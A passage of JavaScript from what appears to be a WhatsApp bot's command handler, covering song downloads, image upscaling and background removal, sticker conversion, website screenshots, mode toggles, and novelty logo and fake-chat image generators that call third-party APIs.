      `https://api.giftedtech.web.id/api/search/ytsearch?apikey=gifted&query=${encodeURIComponent(text)}`;

    const searchRes =
      await axios.get(searchUrl, {
        timeout: 30000
      });

    // ================= VALIDATION =================

    if (
      !searchRes.data ||
      !searchRes.data.results ||
      !Array.isArray(searchRes.data.results) ||
      !searchRes.data.results.length
    ) {

      return reply(
`╭┈┈『 ❌ NOT FOUND 』
│
│ NO SONG FOUND
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      );

    }

    const result =
      searchRes.data.results[0];

    const title =
      result.title || "Unknown";

    const videoUrl =
      result.url;

    const thumbnail =
      result.thumbnail;

    if (!videoUrl) {

      return reply(
`╭┈┈『 ❌ ERROR 』
│
│ INVALID VIDEO URL
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      );

    }

    // ================= DOWNLOAD =================

    const downloadUrl =
      `https://api.giftedtech.web.id/api/download/ytmp3?apikey=gifted&url=${encodeURIComponent(videoUrl)}`;

    const dlRes =
      await axios.get(downloadUrl, {
        timeout: 30000
      });

    // ================= GET AUDIO URL =================

    const audioUrl =
      dlRes?.data?.result?.download_url ||
      dlRes?.data?.result?.url ||
      dlRes?.data?.download_url;

    if (!audioUrl) {

      console.log(dlRes.data);

      return reply(
`╭┈┈『 ❌ DOWNLOAD FAILED 』
│
│ AUDIO LINK NOT FOUND
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      );

    }

    // ================= INFO MESSAGE =================

    await sock.sendMessage(
      from,
      {
        image: {
          url: thumbnail
        },
        caption:
`╭┈┈『 🎶 SONG FOUND 』
│
│ 🎵 TITLE :
│ ${title}
│
│ 📥 DOWNLOADING...
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: mek }
    );

    // ================= SEND AUDIO =================

    await sock.sendMessage(
      from,
      {
        audio: {
          url: audioUrl
        },
        mimetype: "audio/mpeg",
        fileName: `${title}.mp3`,
        ptt: false,
        contextInfo: {
          externalAdReply: {
            title: title,
            body: "YOU WEB BOT MUSIC",
            thumbnailUrl: thumbnail,
            mediaType: 1,
            renderLargerThumbnail: true,
            sourceUrl: videoUrl
          }
        }
      },
      { quoted: mek }
    );

    // ================= SEND DOCUMENT =================

    await sock.sendMessage(
      from,
      {
        document: {
          url: audioUrl
        },
        mimetype: "audio/mpeg",
        fileName: `${title}.mp3`,
        caption:
`╭┈┈『 ✅ 𝚂𝙾𝙽𝙶 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙴𝙳 』
│ 📑 𝚈𝙾𝚄 𝚆𝙴𝙱 𝙱𝙾𝚃
│ 🎵 ${title}
│ 📥 𝚂𝚄𝙲𝙲𝙴𝚂𝚂
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: mek }
    );

    react("✅");

  } catch (e) {

    console.log(
      "PLAY ERROR =>",
      e?.response?.data || e
    );

    react("❌");

    reply(
`╭┈┈『 ❌ ERROR 』
│ FAILED TO DOWNLOAD SONG
│
│ TRY AGAIN LATER
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    );

  }

}
break;

case 'repo': {
    try {

        // ===== REACT =====
        await socket.sendMessage(sender, {
            react: {
                text: "📂",
                key: msg.key
            }
        });

        const repoMsg = `
╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│ ⊹ ࣪ ˖ʏᴏᴜ ᴍᴅ ʀᴇᴘᴏsɪᴛᴏʀʏ
│ ⊹ ࣪ ˖ᴘʀᴏᴊᴇᴄᴛ ᴅᴇᴛᴀɪʟs
│ ⊹ ࣪ ˖ɴᴀᴍᴇ : ʏᴏᴜ ᴍᴅ
│ ⊹ ࣪ ˖ᴀᴜᴛʜᴏʀ : ʏᴏᴜ ᴛᴇᴄʜ
│ ⊹ ࣪ ˖sᴛᴀᴛᴜs : ʀᴜɴɴɪɴɢ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> *ɢᴇᴛ ʟᴀᴛᴇsᴛ ᴠᴇʀsɪᴏɴ ᴀɴᴅ ᴅᴏᴄᴜᴍᴇɴᴛᴀᴛɪᴏɴ ʙᴇʟᴏᴡ ⚡*
`.trim();

        await socket.relayMessage(sender, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "official repository",
                            hasMediaAttachment: false
                        },

                        body: {
                            text: repoMsg
                        },

                        footer: {
                            text: "ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx 🌙"
                        },

                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_url",

                                    buttonParamsJson: JSON.stringify({
                                        display_text: "ᴏᴘᴇɴ ʏᴏᴜ ᴍᴅ ᴡᴇʙ",

                                        url: "https://you-md-16ae1781ef16.herokuapp.com/"
                                    })
                                }
                            ]
                        },

                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true
                        }
                    }
                }
            }
        }, {
            quoted: msg
        });

    } catch (e) {

        console.error("REPO ERROR:", e);

        await socket.sendMessage(sender, {
            text: "https://you-md-16ae1781ef16.herokuapp.com/"
        }, {
            quoted: msg
        });
    }
}
break;

      // ============================================================
case 'mode private':
case 'private': {
  if (!activeSockets.has(senderNumber)) { await socket.sendMessage(sender, { text: '❌ ᴛʜɪs ᴄᴀsᴇ ᴄᴀɴ ʙᴇ ᴜsᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!' }, { quoted: msg }); break; }
  global.botMode = 'private';
  await socket.sendMessage(sender, {
    text: `╭┄┄『𝐁𝐎𝐓 𝐌𝐎𝐃𝐄』\n│ 🔒 *𝐌𝐎𝐃𝐄 𝐏𝐑𝐈𝐕𝐀𝐓𝐄*\n│📑 ʙᴏᴛ ɴᴀᴍᴇ : ʏᴏᴜ ᴡᴇʙ ʙᴏᴛ\n│🌟ᴄʀᴇᴀᴛᴏʀ : ʏᴏᴜ ᴛᴇᴄʜx ᴏғᴄ\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n\n✅ ʏᴏᴜ ᴡᴇʙ ʙᴏᴛ ɪs ɴᴏᴡ *ᴘʀɪᴠᴀᴛᴇ*\n> ${config.BOT_FOOTER}`,
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: '120363426341519710@newsletter',
        newsletterName: config.BOT_NAME,
        serverMessageId: 143
      }
    }
  }, { quoted: msg });
  break;
}

case 'mode public':
case 'public': {
  if (!activeSockets.has(senderNumber)) { await socket.sendMessage(sender, { text: '❌ ᴛʜɪs ᴄᴀsᴇ ᴄᴀɴ ʙᴇ ᴜsᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!' }, { quoted: msg }); break; }
  global.botMode = 'public';
  await socket.sendMessage(sender, {
    text: `╭┄┄『𝐁𝐎𝐓 𝐌𝐎𝐃𝐄』\n│ 🔓 *𝐌𝐎𝐃𝐄 𝐏𝐔𝐁𝐋𝐈𝐂*\n│📑 ʙᴏᴛ ɴᴀᴍᴇ : ʏᴏᴜ ᴡᴇʙ ʙᴏᴛ\n│🌟ᴄʀᴇᴀᴛᴏʀ : ʏᴏᴜ ᴛᴇᴄʜx ᴏғᴄ\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n\n✅ ʏᴏᴜ ᴡᴇʙ ʙᴏᴛ ɪs ɴᴏᴡ *ᴘᴜʙʟɪᴄ*\n> ${config.BOT_FOOTER}`,
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: '120363426341519710@newsletter',
        newsletterName: config.BOT_NAME,
        serverMessageId: 143
      }
    }
  }, { quoted: msg });
  break;
}



case 'uptime': {
  try {

    // ===== REACT =====
    await socket.sendMessage(sender, {
      react: {
        text: "🕸️",
        key: msg.key
      }
    });

    // ===== MODULES =====
    const os = require('os');

    // ===== UPTIME =====
    const uptime = process.uptime();

    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);

    const runtimeText =
      `${hours}ʜ ${minutes}ᴍ ${seconds}s`;

    // ===== RAM =====
    const usedMemory =
      Math.round(process.memoryUsage().heapUsed / 1024 / 1024);

    const totalMemory =
      Math.round(os.totalmem() / 1024 / 1024);

    // ===== USERS =====
    const activeUsers =
      typeof getTotalUsers === "function"
        ? getTotalUsers()
        : 0;

    // ===== MESSAGE =====
    const uptimeMsg = `
╭┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│ 🍂 ${toSmallCaps("you md v1")}
│ 👥 ${toSmallCaps("users")} : ${activeUsers}
│ ⏳ ${toSmallCaps("uptime")} : ${runtimeText}
│ 💾 ${toSmallCaps("ram")} : ${usedMemory}MB / ${totalMemory}MB
│ ⚙️ ${toSmallCaps("prefix")} : [ ${prefix} ]
╰┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> *${toSmallCaps("powered by you tech")}* 🕸️
`.trim();

    // ===== BUTTONS =====
    const buttons = [
      {
        buttonId: '.alive',
        buttonText: {
          displayText: '⚡ ᴀʟɪᴠᴇ'
        },
        type: 1
      },
      {
        buttonId: '.menu',
        buttonText: {
          displayText: '📜 ᴍᴇɴᴜ'
        },
        type: 1
      }
    ];

    // ===== SEND =====
    await socket.sendMessage(sender, {
      image: {
        url: 'https://files.catbox.moe/0lsjly.png'
      },
      caption: uptimeMsg,
      footer: '🕸️ ʏᴏᴜ ᴍᴅ ʙᴏᴛ',
      buttons: buttons,
      headerType: 4
    }, {
      quoted: msg
    });

    // ===== SUCCESS =====
    await socket.sendMessage(sender, {
      react: {
        text: "✅",
        key: msg.key
      }
    });

  } catch (e) {

    console.error("UPTIME ERROR:", e);

    await socket.sendMessage(sender, {
      text: toSmallCaps("uptime error")
    }, {
      quoted: msg
    });

    await socket.sendMessage(sender, {
      react: {
        text: "❌",
        key: msg.key
      }
    });
  }
}
break;



case 'remini':
case 'enhance':
case 'hd': {

  try {

    react("✨");

    // ================= CHECK IMAGE =================

    const q =
      quoted ? quoted : mek;

    const mime =
      (q.msg || q).mimetype || '';

    if (!mime.startsWith('image')) {

      react("❌");

      return reply(
`╭┈┈『 ✨ HD ENHANCE 』
│
│ ❌ REPLY TO AN IMAGE
│
│ 📌 EXAMPLE :
│ .hd
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      );

    }

    // ================= DOWNLOAD IMAGE =================

    const buffer =
      await q.download();

    if (!buffer) {

      react("❌");

      return reply(
`╭┈┈『 ❌ ERROR 』
│
│ FAILED TO DOWNLOAD IMAGE
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      );

    }

    // ================= REQUIRE =================

    const axios =
      require("axios");

    const FormData =
      require("form-data");

    // ================= UPLOAD =================

    const form =
      new FormData();

    form.append(
      "file",
      buffer,
      "image.jpg"
    );

    // ================= STATUS =================

    await sock.sendMessage(
      from,
      {
        text:
`╭┈┈『 ⏳ PROCESSING 』
│
│ ✨ ENHANCING IMAGE...
│ 🚀 PLEASE WAIT
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: mek }
    );

    // ================= TMP UPLOAD =================

    const upload =
      await axios.post(
        "https://tmpfiles.org/api/v1/upload",
        form,
        {
          headers:
            form.getHeaders(),
          maxBodyLength: Infinity,
          timeout: 60000
        }
      );

    // ================= CHECK UPLOAD =================

    if (
      !upload.data ||
      !upload.data.data ||
      !upload.data.data.url
    ) {

      react("❌");

      return reply(
`╭┈┈『 ❌ UPLOAD FAILED 』
│
│ IMAGE HOST ERROR
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      );

    }

    // ================= IMAGE URL =================

    const imageUrl =
      upload.data.data.url
        .replace(
          "tmpfiles.org/",
          "tmpfiles.org/dl/"
        );

    // ================= AI UPSCALE =================

    // ✅ FIX: Use waifu2x-caffe API (reliable) or fallback to replicate-style API
    // Primary: use picwish API for image upscale
    const upscaleApi =
      `https://api.giftedtech.web.id/api/enhance/upscale?apikey=gifted&url=${encodeURIComponent(imageUrl)}`;

    const upscale =
      await axios.get(
        upscaleApi,
        {
          timeout: 60000
        }
      );

    // ================= RESULT =================

    const result =
      upscale.data?.result?.url ||
      upscale.data?.output ||
      upscale.data?.url ||
      upscale.data?.result;

    if (!result) {

      console.log(upscale.data);

      react("❌");

      return reply(
`╭┈┈『 ❌ UPSCALE FAILED 』
│
│ AI COULD NOT
│ ENHANCE IMAGE
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      );

    }

    // ================= SEND RESULT =================

    await sock.sendMessage(
      from,
      {
        image: {
          url: result
        },

        caption:
`╭┈┈『 ✨ HD ENHANCED 』
│
│ ✅ IMAGE UPSCALED
│ 🚀 QUALITY IMPROVED
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> MADE IN BY YOU TECHX OFC`,

        contextInfo: {

          newsletterJid:
            "120363426341519710@newsletter",

          newsletterName:
            "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

          externalAdReply: {

            title:
              "ᴅєν уσυ нᴅ ᴇɴнᴀɴᴄᴇʀ",

            body:
              "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",

            thumbnailUrl:
              result,

            mediaType: 1,

            renderLargerThumbnail: true,

            sourceUrl:
              result

          }

        }

      },
      { quoted: mek }
    );

    react("✅");

  } catch (e) {

    console.log(
      "HD ERROR =>",
      e?.response?.data || e
    );

    react("❌");

    reply(
`╭┈┈『 ❌ ERROR 』
│
│ FAILED TO ENHANCE IMAGE
│
│ TRY AGAIN LATER
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    );

  }

}
break;



case 'getimage': {

  try {

    react("🖼️");

    // ================= GET TEXT =================

    const q =
      msg.message?.conversation ||
      msg.message?.extendedTextMessage?.text ||
      msg.message?.imageMessage?.caption ||
      msg.message?.videoMessage?.caption ||
      '';

    const args =
      q.trim().split(/\s+/);

    args.shift();

    const imageUrl =
      args.join(' ').trim();

    // ================= CHECK URL =================

    if (!imageUrl) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 🖼️ GETIMAGE 』
│
│ ❌ PLEASE PROVIDE
│ AN IMAGE URL
│
│ 📌 EXAMPLE :
│ .getimage https://example.com/image.jpg
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= VALID URL =================

    const isValid =
      imageUrl.startsWith("http://") ||
      imageUrl.startsWith("https://");

    if (!isValid) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ❌ INVALID URL 』
│
│ PLEASE ENTER
│ A VALID IMAGE URL
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= SEND IMAGE =================

    await socket.sendMessage(
      from,
      {
        image: {
          url: imageUrl
        },

        caption:
`╭┈┈『 ✅ GETIMAGE 』
│
│ 🖼️ IMAGE SENT
│ SUCCESSFULLY
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> MADE IN BY YOU TECHX OFC`,

        mimetype: "image/png",

        contextInfo: {

          newsletterJid:
            "120363426341519710@newsletter",

          newsletterName:
            "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

          externalAdReply: {

            title:
              "ᴅєν уσυ  ɢᴇɴᴇʀᴀᴛᴏʀ",

            body:
              "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",

            thumbnailUrl:
              imageUrl,

            mediaType: 1,

            renderLargerThumbnail: true,

            sourceUrl:
              imageUrl

          }

        }

      },
      { quoted: msg }
    );

    react("✅");

  } catch (e) {

    console.error(
      "GETIMAGE ERROR =>",
      e
    );

    react("❌");

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ❌ ERROR 』
│
│ FAILED TO GET IMAGE
│
│ TRY AGAIN LATER
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: msg }
    );

  }

}
break;


case 'phlogo':
case 'pornhub':
case 'ph': {

  try {

    react("🎨");

    const axios = require("axios");

    // ================= TEXT =================

    const input =
      args.join(" ").trim();

    // ================= CHECK FORMAT =================

    if (
      !input ||
      !input.includes("|")
    ) {

      return reply(
`╭┈┈『 🎨 PHLOGO 』
│
│ ❌ INVALID FORMAT
│
│ 📌 EXAMPLE :
│ .phlogo Heinz | MD
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      );

    }

    // ================= SPLIT TEXT =================

    const [
      text1,
      text2
    ] = input
      .split("|")
      .map(v => v.trim());

    if (
      !text1 ||
      !text2
    ) {

      return reply(
`╭┈┈『 ❌ ERROR 』
│
│ ENTER TWO TEXTS
│
│ EXAMPLE :
│ .phlogo YOU | TECH
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      );

    }

    // ================= API URL =================

    const apiUrl =
      `https://apikey.sazxofficial.web.id/api/imagecreator/pornhub?text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`;

    // ================= FETCH API =================

    const response =
      await axios.get(apiUrl, {
        timeout: 30000
      });

    const data =
      response.data;

    // ================= VALIDATION =================

    if (
      !data ||
      !data.status ||
      !data.result
    ) {

      console.log(data);

      react("❌");

      return reply(
`╭┈┈『 ❌ API ERROR 』
│
│ API IS OFFLINE
│ OR INVALID RESPONSE
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      );

    }

    // ================= SEND IMAGE =================

    await sock.sendMessage(
      from,
      {
        image: {
          url: data.result
        },

        caption:
`╭┈┈『 🔞 PHLOGO 』
│
│ ✅ LOGO CREATED
│
│ ✏️ TEXT 1 :
│ ${text1}
│
│ ✏️ TEXT 2 :
│ ${text2}
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> MADE IN BY YOU TECHX OFC`,

        contextInfo: {

          forwardingScore: 999,
          isForwarded: true,

          forwardedNewsletterMessageInfo: {
            newsletterJid:
              "120363426341519710@newsletter",

            newsletterName:
              "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

            serverMessageId: 143
          },

          externalAdReply: {

            title:
              "YOU WEB BOT LOGO GENERATOR",

            body:
              "POWERED BY YOU TECHX OFC",

            thumbnailUrl:
              data.result,

            mediaType: 1,

            renderLargerThumbnail: true,

            showAdAttribution: false,

            sourceUrl:
              data.result

          }

        }

      },
      { quoted: mek }
    );

    react("✅");

  } catch (e) {

    console.log(
      "PHLOGO ERROR =>",
      e?.response?.data || e
    );

    react("❌");

    reply(
`╭┈┈『 ❌ ERROR 』
│
│ FAILED TO CREATE LOGO
│
│ TRY AGAIN LATER
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    );

  }

}
break;

// ===============================
// TOIMAGE
// ===============================

case 'toimage': {
  try {

    const quoted =
      msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;

    if (!quoted?.stickerMessage) {

      return await socket.sendMessage(from, {
        text:
`╭┄〔 ❌ TOIMAGE ERROR 〕
│
│ Reply to a sticker
│
│ Example:
│ .toimage
│
╰──────────────ᕗ`
      }, { quoted: msg });

    }

    await socket.sendMessage(from, {
      react: {
        text: "🖼️",
        key: msg.key
      }
    });

    const {
      downloadContentFromMessage
    } = require("@ryuu-reinzz/baileys");

    const stream =
      await downloadContentFromMessage(
        quoted.stickerMessage,
        "sticker"
      );

    let buffer =
      Buffer.from([]);

    for await (const chunk of stream) {

      buffer =
        Buffer.concat([buffer, chunk]);

    }

    const fs = require("fs");
    const path = require("path");
    const crypto = require("crypto");
    const ffmpeg = require("fluent-ffmpeg");

    const input =
      path.join(
        __dirname,
        `${crypto.randomBytes(5).toString("hex")}.webp`
      );

    const output =
      path.join(
        __dirname,
        `${crypto.randomBytes(5).toString("hex")}.png`
      );

    fs.writeFileSync(input, buffer);

    await new Promise((resolve, reject) => {

      ffmpeg(input)
        .toFormat("png")
        .save(output)
        .on("end", resolve)
        .on("error", reject);

    });

    await socket.sendMessage(from, {
      image: fs.readFileSync(output),
      caption:
`╭┄〔 ✅ TOIMAGE SUCCESS 〕
│
│ Sticker converted
│ to image successfully
│
╰──────────────ᕗ`,

      contextInfo: {
        newsletterJid: "120363426341519710@newsletter",
        newsletterName: "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

        externalAdReply: {
          title: "𝐓𝐎𝐈𝐌𝐀𝐆𝐄",
          body: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",
          thumbnailUrl:
            "https://files.catbox.moe/indcm8.jpg",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl:
            "https://whatsapp.com/channel/0029Vb7EpGwBlHpXKNgFET1Z"
        }
      }

    }, { quoted: msg });

    fs.unlinkSync(input);
    fs.unlinkSync(output);

    await socket.sendMessage(from, {
      react: {
        text: "✅",
        key: msg.key
      }
    });

  } catch (e) {

    console.log("TOIMAGE ERROR:", e);

    await socket.sendMessage(from, {
      text:
`╭┄〔 ❌ ERROR 〕
│
│ Failed to convert sticker
│ to image
│
╰──────────────ᕗ`
    }, { quoted: msg });

  }
}
break;


// ===============================
// SSWEB
// ===============================

case 'ssweb':
case 'ss': {
  try {

    const axios = require("axios");

    const query =
      args.join(" ");

    if (!query) {

      return await socket.sendMessage(from, {
        text:
`╭┄〔 🌐 SSWEB USAGE 〕
│
│ Example:
│ .ssweb https://google.com
│
╰──────────────ᕗ`
      }, { quoted: msg });

    }

    let url = query;

    if (!/^https?:\/\//i.test(url)) {

      url = "https://" + url;

    }

    await socket.sendMessage(from, {
      react: {
        text: "📸",
        key: msg.key
      }
    });

    const api =
      `https://image.thum.io/get/fullpage/${encodeURIComponent(url)}`;

    await socket.sendMessage(from, {
      image: {
        url: api
      },

      caption:
`╭┄〔 ✅ WEBSITE SCREENSHOT 〕
│
│ 🌐 URL:
│ ${url}
│
╰──────────────ᕗ`,

      contextInfo: {
        newsletterJid: "120363426341519710@newsletter",
        newsletterName: "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

        externalAdReply: {
          title: "𝐒𝐒𝐖𝐄𝐁",
          body: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",
          thumbnailUrl:
            "https://files.catbox.moe/indcm8.jpg",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: url
        }
      }

    }, { quoted: msg });

    await socket.sendMessage(from, {
      react: {
        text: "✅",
        key: msg.key
      }
    });

  } catch (e) {

    console.log("SSWEB ERROR:", e);

    await socket.sendMessage(from, {
      text:
`╭┄〔 ❌ ERROR 〕
│
│ Failed to capture website
│ screenshot
│
╰──────────────ᕗ`
    }, { quoted: msg });

  }
}
break;


case 'couplepp':
case 'ppcp': {
  try {
    const axios = require("axios");

    await socket.sendMessage(from, {
      react: { text: "👩‍❤️‍👨", key: msg.key }
    });

    const apiUrl = `https://apis.davidcyril.name.ng/couplepp?apikey=`;
    const response = await axios.get(apiUrl);

    if (!response.data || !response.data.success) {
      return socket.sendMessage(from, {
        text: toSmallCaps("api error: impossible de récupérer les images.")
      }, { quoted: msg });
    }

    const res = response.data;

    await socket.sendMessage(from, {
      image: { url: res.male },
      caption: `♂️ *${toSmallCaps("you md male")}*`
    }, { quoted: msg });

    await socket.sendMessage(from, {
      image: { url: res.female },
      caption: `♀️ *${toSmallCaps("you md female")}*`
    }, { quoted: msg });

    await socket.sendMessage(from, {
      react: { text: "✅", key: msg.key }
    });

  } catch (e) {

    console.error("CouplePP Error:", e);

    socket.sendMessage(from, {
      text: toSmallCaps("le serveur david cyril ne répond pas.")
    }, { quoted: msg });

  }
}
break;

case 'removebg':
case 'rmbg': {

  try {

    const axios =
      require("axios");

    const FormData =
      require("form-data");

    const {
      downloadContentFromMessage
    } = require(
      "@ryuu-reinzz/baileys"
    );

    // ================= REACT =================

    react("🪄");

    // ================= GET QUOTED =================

    const quoted =
      msg.message?.extendedTextMessage
        ?.contextInfo
        ?.quotedMessage;

    // ================= CHECK =================

    if (!quoted) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 🪄 REMOVE BG 』
│
│ ❌ REPLY TO AN IMAGE
│
│ 📌 EXAMPLE :
│ .removebg
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= IMAGE FIX =================

    const imageMsg =
      quoted.imageMessage ||
      quoted.ephemeralMessage?.message?.imageMessage ||
      quoted.viewOnceMessage?.message?.imageMessage ||
      quoted.viewOnceMessageV2?.message?.imageMessage;

    // ================= CHECK IMAGE =================

    if (!imageMsg) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ❌ INVALID 』
│
│ REPLY TO A VALID IMAGE
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= PROCESS MESSAGE =================

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ⏳ PROCESSING 』
│
│ 🪄 REMOVING BACKGROUND
│ 🚀 PLEASE WAIT...
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: msg }
    );

    // ================= DOWNLOAD =================

    const stream =
      await downloadContentFromMessage(
        imageMsg,
        "image"
      );

    let media =
      Buffer.from([]);

    for await (
      const chunk of stream
    ) {

      media =
        Buffer.concat([
          media,
          chunk
        ]);

    }

    // ================= CHECK MEDIA =================

    if (
      !media ||
      media.length < 10
    ) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ❌ DOWNLOAD FAILED 』
│
│ FAILED TO
│ DOWNLOAD IMAGE
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= UPLOAD =================

    const form =
      new FormData();

    form.append(
      "fileToUpload",
      media,
      "image.png"
    );

    form.append(
      "reqtype",
      "fileupload"
    );

    const upload =
      await axios.post(
        "https://catbox.moe/user/api.php",
        form,
        {
          headers:
            form.getHeaders(),

          maxBodyLength:
            Infinity,

          timeout: 60000
        }
      );

    const imageUrl =
      upload.data;

    // ================= CHECK URL =================

    if (
      !imageUrl ||
      !String(imageUrl)
        .startsWith("http")
    ) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ❌ UPLOAD FAILED 』
│
│ FAILED TO UPLOAD IMAGE
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= API =================

    const apiUrl =
      `https://apis.davidcyril.name.ng/removebg?url=${encodeURIComponent(imageUrl)}`;

    // ================= SEND RESULT =================

    await socket.sendMessage(
      from,
      {
        image: {
          url: apiUrl
        },

        caption:
`╭┈┈『 🪄 REMOVE BG 』
│
│ ✅ BACKGROUND REMOVED
│ 🚀 IMAGE PROCESSED
│ SUCCESSFULLY
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> MADE IN BY YOU TECHX OFC`,

        contextInfo: {

          newsletterJid:
            "120363426341519710@newsletter",

          newsletterName:
            "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

          externalAdReply: {

            title:
              "ᴅєν уσυ ʀᴇᴍᴏᴠᴇʙɢ",

            body:
              "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",

            thumbnailUrl:
              apiUrl,

            mediaType: 1,

            renderLargerThumbnail: true,

            sourceUrl:
              apiUrl

          }

        }

      },
      { quoted: msg }
    );

    // ================= SUCCESS =================

    react("✅");

  } catch (e) {

    console.error(
      "REMOVEBG ERROR =>",
      e?.response?.data || e
    );

    react("❌");

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ❌ ERROR 』
│
│ FAILED TO REMOVE
│ IMAGE BACKGROUND
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: msg }
    );

  }

}
break;

case 'iphonequote':
case 'fakechat':
case 'iphone': {

  try {

    react("📱");

    // ================= TEXT =================

    const text =
      args.join(" ").trim() ||
      body
        .slice(
          prefix.length +
          command.length
        )
        .trim();

    // ================= CHECK =================

    if (!text) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 📱 IPHONE FAKECHAT 』
│
│ ❌ ENTER A MESSAGE
│
│ 📌 EXAMPLE :
│ .iphone Hello YOU WEB BOT
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= API =================

    const apiUrl =
      `https://www.veloria.my.id/imagecreator/fake-chat?time=12:00&messageText=${encodeURIComponent(text)}&batteryPercentage=100`;

    // ================= CAPTION =================

    const caption =
`╭┈┈『 📱 IPHONE CHAT 』
│
│ ✅ FAKE CHAT CREATED
│
│ 💬 MESSAGE :
│ ${text}
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> MADE IN BY YOU TECHX OFC`;

    // ================= SEND BUTTON IMAGE =================

    await socket.sendMessage(
      from,
      {
        image: {
          url: apiUrl
        },

        caption: caption,

        footer:
          "POWERED BY YOU TECHX",

        buttons: [

          {
            buttonId:
